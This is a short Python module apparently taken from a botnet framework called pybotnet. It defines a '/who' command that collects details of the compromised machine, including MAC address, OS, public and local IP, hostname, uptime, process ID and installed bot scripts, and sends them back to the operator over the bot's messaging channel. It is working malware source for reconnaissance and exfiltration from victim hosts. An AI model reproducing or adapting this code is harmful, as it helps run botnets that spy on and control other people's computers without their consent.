from .. import BotNet, Context


@BotNet.default_script(script_version="0.0.1")
def who(context: Context) -> str:
    """return system info

    Example command: `/who` \n

    Return:
    * scripts_name
    * mac_addres
    * os
    * global_ip
    * up_time
    * host_name
    * local_ip
    * current_route
    * pid
    * cpu_count
    * pybotnet_version
    
    (context.system_info(): cache for 30 seconds)
    """

    info = ""

    for k, v in context.system_info().items():
        if k == "scripts_name":
            info += "scripts_name:\n"
            for scripts_name in v:
                info += f"    {scripts_name}\n"
        else:
            info += f"\n{k}: {v}"

    context.engine.send(info, reply_to_last_message=True)
